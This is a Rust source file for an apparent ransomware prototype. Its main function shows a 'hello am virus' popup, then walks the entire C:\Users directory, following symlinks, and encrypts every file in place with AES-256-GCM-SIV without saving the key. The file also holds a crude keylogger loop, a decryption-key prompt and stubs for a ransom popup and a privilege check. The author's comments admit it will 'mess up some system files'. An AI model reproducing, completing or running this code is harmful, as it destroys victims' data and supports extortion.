#![allow(warnings)]
#[allow(dead_code)]
use aes_gcm_siv::aead::generic_array::GenericArray;
use aes_gcm_siv::aead::Aead;
use aes_gcm_siv::{Aes256GcmSiv, KeyInit, Nonce};
use crossterm::event::{poll, read, Event, KeyCode};
use crossterm::terminal::enable_raw_mode;
use dioxus::prelude::*;
use dioxus_desktop;
use rand_chacha::rand_core::{RngCore, SeedableRng};
use rand_chacha::ChaCha20Rng;
use std::fs::File;
use std::io::{Read, Write};
use std::process::Command;
use std::{io, path::Path};
use walkdir::{DirEntry, Error, WalkDir};
//TODO: check the speed of this later
//TODO: gonna need to add more later,

fn main() {
    // create a popup on windows systems

    let cmd = Command::new("cmd")
        .arg("/C")
        .arg("start cmd /K echo hello am virus")
        .spawn()
        .expect("ruh roh");

    /**
     * Use AES-256
     * Same key for all files, different nonce for each file
     *
     * Notes: nonce is to make sure 2 identical plaintexts produce different output
     * counter is to make sure 2 identical blocks within the same plaintext produce different output
     *
     * Returns: the cipher object
     */
    let mut rng = ChaCha20Rng::from_entropy(); //FIXME: later. I dont like that this rng code is repeated twice
    let mut nonce_array = [0u8; 12];
    rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
    let nonce = Nonce::from_slice(&nonce_array);

    //FIXME: up to here. making the nonce
    let key = Aes256GcmSiv::generate_key(rng);
    let cipher = Aes256GcmSiv::new(&key);

    traverse(true, &cipher); //iterates through all the files and calls the encrypt function on each one
}

/**
 * check if the required resources are installed.
 * if not, install them
 */
fn check_requirements() {
    let cmd = Command::new("sh")
        .arg("-c")
        .arg("zenity")
        .output()
        .expect("zenity not installed");

    if !cmd.status.success() {
        //TODO: add more prints here later maybe for useability or maybe not
        //install zenity
        //
        println!("installing zenity");
        let install_cmd: std::process::Output = Command::new("sh")
            .arg("-c")
            .arg("sudo apt-get install zenity")
            .output()
            .expect("failed to install zenity");
    }
}

fn display_message() {
    //popup WITH THE DECRYPTION KEY ON THE POPUP
    //idk what to use for thsi
}

/**
 * This is a test function to make sure the encryption is working
 *
 * only encrypts the files on the desktop. used for testing so i dont break anything accidentally
 */
fn test_encryptfile() {
    //the file in the windows vm is called restored
    let mut testfile = File::open("restored").expect("can't open file o no");
    let mut buffer = Vec::new();
    testfile
        .read_to_end(&mut buffer)
        .expect("can't load file contents");

    //call the generate key function
    let mut rng = ChaCha20Rng::from_entropy();
    let mut nonce_array = [0u8; 12];
    rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
    let nonce = Nonce::from_slice(&nonce_array);

    //FIXME: up to here. making the nonce
    let key = Aes256GcmSiv::generate_key(rng);
    let cipher = Aes256GcmSiv::new(&key);

    let ciphertext = cipher.encrypt(nonce, buffer.as_ref());
    //put the ciphertext back in the file

    testfile.set_len(0);
    testfile.write_all(&ciphertext.unwrap().as_slice()); //tvector -> slice
                                                         //why this no work tho

    //print the key and nonce TODO: check if :? is alg or display
    println!("key: {:?}", key);

    //TODO: !!!!! read the contents of the file!
    //this will be in the completed code but not in this test function because im lazy

    loop {
        //delay and wait for user to enter the decryption key
        //TODO: print the key needed for decryption
        let mut user_input = String::new();
        println!("Enter decryption key pls: ");
        io::stdin().read_line(&mut user_input).unwrap();
        let user_input_bytes = user_input.as_bytes(); //convert to bytes

        //TODO: UP TO HERE TODAY
        //key length 32, nonce length 12
        if user_input_bytes.len() != 32 {
            //print error
            println!("Invalid key length");
        } else {
            // //FIXME: convert byte array into key format why this no work
            // //WHY THIS NO WORK
            // let user_key = GenericArray::clone_from_slice(&user_input_bytes[0..32]);
            // //decrypt using the key
            // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
        }
        //convert to key
    }
    //TODO: put user input into the correct variable type
    //try decrypting with this key, print if it works or not
}

/**
 *
 * Note
 * find all the files in subdirectories.
 * follow symlinks, don't skip hidden files
 *
 * FIXME: this will probably mess up some system files, fix later
 */
fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
    //return result
    //search recursively through all directories and find files
    let mut file = File::create("C:\\Users\\win11\\Desktop\\output.txt");

    for entry in WalkDir::new("C:\\Users\\").follow_links(true) {
        match entry {
            Ok(entry) => {
                writeln!(
                    //this is just debug code
                    file.as_ref().unwrap(),
                    "found file: {}",
                    entry.path().display()
                );
                encrypt(entry.path(), cipher);
            }
            Err(e) => {
                writeln!(file.as_ref().unwrap(), "Error: {}", e);
            }
        }
    }
    Ok(())
}

/**
 * Encrypt a file, using given path and the same key for all files
 * Use different nonce for each file, prepend to file
 */
fn encrypt(path: &Path, cipher: &Aes256GcmSiv) {
    let mut file = File::open(path).expect("can't open file");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)
        .expect("can't load file contents");

    //TODO: make a nonce, use it, append to the beginning or end of file
    let mut rng = ChaCha20Rng::from_entropy();
    let mut nonce_array = [0u8; 12];
    rng.fill_bytes(&mut nonce_array);
    let nonce = Nonce::from_slice(&nonce_array);
    let ciphertext = cipher.encrypt(nonce, buffer.as_ref());
    //put the ciphertext bac into the file
    file.set_len(0);
    file.write_all(&ciphertext.unwrap().as_slice());

    //TESTCODE: delete later. shows the key so i dont lock myself out
}

/**
 * Decrypt a file
 */
fn decrypt(path: &Path, cipher: &Aes256GcmSiv) {
    //
}

fn keylogger() {
    //killswitch if user types please
    //
    // let cmd = Command::new("cmd.exe")
    //     .arg("/K")
    //     .arg("echo keylogger started \n")
    //     .spawn()
    //     .expect("failed to start keylogger");
    enable_raw_mode();
    println!("weewoo");

    loop {
        //match case for different keys pressed

        match read().unwrap() {
            //read any event
            Event::Key(event) => match event.code {
                KeyCode::Char(character) => {
                    println!("pressed: {}", character);

                    // let cmd = Command::new("cmd.exe")
                    //     .arg("/K")
                    //     .arg(format!("print {} \n", character))
                    //     .spawn()
                    //     .expect("failed to start keylogger");
                }
                _ => {}
            },
            _ => {}
        }
    }
}

//TODO: is this even necessary with windows?
fn root_check() { //
                  //if we dont have root. give popup: "may i plz have root 🥺👉🏽👈🏽"
}
